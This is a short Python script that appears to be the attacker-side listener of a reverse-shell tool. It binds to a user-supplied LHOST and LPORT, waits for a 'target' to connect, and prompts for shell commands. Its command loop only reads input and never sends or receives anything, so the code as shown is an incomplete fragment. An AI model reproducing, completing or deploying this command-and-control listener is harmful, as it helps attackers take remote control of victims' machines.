import socket

def target_communication():
    while True:
        command = input('* Shell~%s:' % str(ip))

LHOST = input('what\'s your LHOST? ')
LPORT = input('what\'s your LPORT? ')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, int(LPORT)))
print(LHOST)
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
